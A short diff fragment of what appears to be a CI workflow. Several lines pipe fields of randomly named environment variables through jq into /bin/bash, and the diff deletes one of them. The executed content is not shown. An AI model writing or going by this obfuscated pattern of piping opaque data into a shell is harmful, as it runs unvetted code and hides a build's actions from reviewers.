@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
           echo $dhxqt0 | jq -r .j99 | /bin/bash
           echo $zw409 | jq -r .oxsmr4556 | /bin/bash
-          echo $xi6 | jq -r .d414 | /bin/bash
           echo $bxoyo388 | jq -r .l4815 | /bin/bash
 
       - name: Archive results
